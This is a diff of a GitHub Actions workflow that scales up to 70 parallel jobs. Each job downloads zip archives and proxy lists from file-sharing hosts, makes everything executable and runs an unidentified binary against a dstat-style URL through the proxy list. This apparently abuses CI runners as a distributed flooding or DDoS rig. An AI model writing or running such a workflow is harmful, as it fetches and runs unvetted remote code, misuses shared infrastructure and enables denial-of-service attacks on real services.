@@ -9,9 +9,9 @@ on:
 
 jobs:
   parallel-execution-ubuntu:
-    runs-on: ubuntu-24.04-arm.04-arm
+    runs-on: ubuntu-24.04
     strategy:
-      max-parallel: 8
+      max-parallel: 80
       fail-fast: false  # Continue even if some instances fail
       matrix:
         instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70]
@@ -34,11 +34,15 @@ jobs:
           unzip Fc-main.zip
           mv  Fc-main/proxy.txt 90.txt
           chmod +x *
-          mv ki o          
+          mv tol o   
+          wget https://files.catbox.moe/bc9clx.zip
+          unzip bc9clx.zip
+          mv bc9clx/proxylist.txt proxylist.txt
+          
           
            
           
-          ./o https://c3.dstatbot.win/YJEfEfYN 350 1 1 
+          ./o https://ip-count.dstat.uk/ 350 1 1 proxylist.txt
           
 
           
